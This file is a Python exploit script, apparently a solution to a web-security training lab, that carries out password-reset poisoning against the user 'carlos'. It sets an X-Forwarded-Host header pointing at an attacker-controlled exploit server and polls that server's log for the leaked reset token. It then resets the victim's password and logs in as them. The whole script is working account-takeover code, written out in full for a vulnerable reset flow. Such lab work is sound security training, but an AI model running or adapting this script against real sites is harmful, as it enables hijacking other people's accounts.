import requests
import sys
import urllib3
import time
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})
    return csrf.get('value', '') if csrf else '' # type: ignore

def login_acc(s, url, path, csrf_path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, csrf_path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def forgot_password(s, url, path, csrf_path, username, headers):
    target_url = url + path
    payload = {
        'username': username,
        'csrf': get_csrf_token(s, url, csrf_path)
    }
    r = s.post(target_url, data=payload, headers=headers, allow_redirects=False)

    if 'Please check your email for a reset password link.' in r.text and r.status_code == 200:
        print('[+] Sent password reset url to email')
    else:
        print('[-] Failed to trigger reset password')
        sys.exit(-1)

def get_reset_password_token(s, exploit_url, path):
    target_url = exploit_url + path
    r = s.get(target_url)
    print('Wait for vitim click injection page...')
    while 'temp-forgot-password-token' not in r.text:
        time.sleep(2)
        r = s.get(target_url)
    reset_pass_token = r.text.split('temp-forgot-password-token=')[-1].split(' HTTP')[0]
    return reset_pass_token

def reset_password(s, url, path, csrf_path, token, new_password):
    target_url = url + path
    payload = {
        'csrf': get_csrf_token(s, url, csrf_path),
        'temp-forgot-password-token': token,
        'new-password-1': new_password,
        'new-password-2': new_password
    }
    r = s.post(target_url, data=payload, allow_redirects=False)

    if r.status_code == 302:
        print(f'[+] Success change password to "{new_password}"')
    else:
        print('[-] Failed to change password')
        sys.exit(-1)

def reset_carlos_password(s, url, reset_pass_token, new_pass):
    reset_pass_url = url + '/forgot-password?temp-forgot-password-token=' + reset_pass_token
    payload = {
        'temp-forgot-password-token': reset_pass_token,
        'new-password-1': new_pass,
        'new-password-2': new_pass,
    }
    print('Reset Carlos password...')
    r = s.post(reset_pass_url, data=payload, headers=headers, allow_redirects=False)

    if r.status_code == 302:
        print('Success reset Carlos password')
    else:
        print('(-) Fail to reset Carlos password')

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.exploit.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    exploit_url = sys.argv[2].rstrip('/')

    target_user = 'carlos'
    new_password = 'test'
    custom_headers = {
        'X-Forwarded-Host': exploit_url.split('//')[1]
    }

    forgot_password(s, url, '/forgot-password', '/forgot-password', target_user, custom_headers)
    reset_password_token = get_reset_password_token(s, exploit_url, '/log')
    reset_password(s, url, '/forgot-password', '/forgot-password', reset_password_token, new_password)
    login_acc(s, url, '/login', '/login', target_user, new_password)

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()